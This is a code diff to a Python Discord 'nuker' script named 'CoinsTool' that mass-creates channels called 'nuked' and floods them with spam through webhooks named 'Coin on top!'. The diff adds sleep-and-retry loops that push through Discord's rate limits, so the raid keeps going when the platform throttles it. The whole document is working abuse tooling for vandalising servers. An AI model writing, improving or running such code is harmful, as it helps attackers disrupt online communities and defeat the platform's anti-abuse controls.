@@ -1,11 +1,13 @@
 category=""
 import os
 import time
+import asyncio
 import json
 from discord.ext import commands
 import threading
 import httpx
 import discord
+ratelimit = False
 os.system("title (CoinsTool) Nuker")
 
 with open("configs/nukerconfig.json") as data:
@@ -81,19 +83,85 @@ def spam_webhook(webhook):
                 idk()
                 os.system(f"title (CoinsTool) Nuker - {x} messages sent")
             else:
-                print(f"{red}Rate Limit! {white}")
+                print(f"{purple}Webhook {white}- {red}Rate Limit! {white}")
                 time.sleep(1)
         except Exception as e:
             print(e)
             pass
 def between(webhook):
     threading.Thread(target=spam_webhook,args=(webhook,)).start()
-async def forever_send_msg(channel):
-    webhook = await channel.create_webhook(name="Coin on top!")
-    between(webhook)
+async def forever_send_msg(channel,retry=False):
+    try:
+        print(f"{purple}Waiting to create webhook...{white}")
+        try:
+            webhook = await channel.create_webhook(name="Coin on top!")
+            wb = True
+        except:
+            print(f"{red}Webhook Create - Rate limit, retrying...{white}")
+            await asyncio.sleep(10)
+            wb=False
+            await forever_send_msg2(channel,True)
+            pass
+        if wb:
+            print(f"{green}Created webhook!{white}")
+            between(webhook)
+    except Exception as e:
+        print(red+str(e)+white)
+        pass
+async def forever_send_msg2(channel,retry=False):
+    try:
+        print(f"{purple}Waiting to create webhook...{white}")
+        try:
+            webhook = await channel.create_webhook(name="Coin on top!")
+            wb = True
+        except:
+            print(f"{red}Webhook Create - Rate limit, retrying...{white}")
+            await asyncio.sleep(10)
+            wb=False
+            await forever_send_msg(channel,True)
+            pass
+        if wb:
+            print(f"{green}Created webhook!{white}")
+            between(webhook)
+    except Exception as e:
+        print(red+str(e)+white)
+        pass
 async def create_channel(guild,name,cat):
-    channel = await guild.create_text_channel(str(name),category=cat)
-    await forever_send_msg(channel=channel)
+    try:
+        print(f"{purple}Waiting to create text channel... {white}")
+        try:
+            channel = await guild.create_text_channel(str(name),category=cat)
+            ch = True
+        except:
+            print(f"{red}Text Channel Create - Rate limit, retrying...{white}")
+            await asyncio.sleep(10)
+            ch=False
+            await create_channel2(guild,name,cat)
+            pass
+        if ch:
+            print(f"{green}Created text channel!{white}")
+            await forever_send_msg(channel=channel)
+    except Exception as e:
+        print(red+str(e)+white)
+        pass
+async def create_channel2(guild,name,cat):
+    try:
+        print(f"{purple}Waiting to create text channel... {white}")
+        try:
+            channel = await guild.create_text_channel(str(name),category=cat)
+            ch = True
+        except:
+            print(f"{red}Text Channel Create - Rate limit, retrying...{white}")
+            await asyncio.sleep(10)
+            ch=False
+            await create_channel(guild,name,cat)
+            pass
+        if ch:
+            print(f"{green}Created text channel!{white}")
+            await forever_send_msg(channel=channel)
+    except Exception as e:
+        print(red+str(e)+white)
+        pass
 async def nuke(guild):
     global category
     await create_channel(guild=guild,name="nuked",cat=category)
